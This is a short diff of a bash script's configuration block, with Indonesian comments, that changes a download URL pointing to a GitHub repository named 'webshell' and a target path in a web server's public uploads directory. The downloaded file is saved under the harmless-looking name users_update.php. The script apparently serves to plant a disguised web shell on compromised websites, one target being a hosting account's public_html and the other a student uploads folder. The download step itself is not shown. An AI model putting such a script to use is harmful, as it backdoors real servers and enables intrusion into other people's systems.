@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # Konfigurasi
-URL="https://raw.githubusercontent.com/alexithema/webshell/refs/heads/main/user_upgrade.php"
-DOWNLOAD_DIR="/home/u757785818/domains/jcsjo.com/public_html/"
+URL="https://raw.githubusercontent.com/alexithema/webshell/refs/heads/main/alex1337.php"
+DOWNLOAD_DIR="/var/www/kukerta/uploads/mahasiswa/"
 OUTPUT_FILE="users_update.php"
 OUTPUT_PATH="$DOWNLOAD_DIR/$OUTPUT_FILE"
 
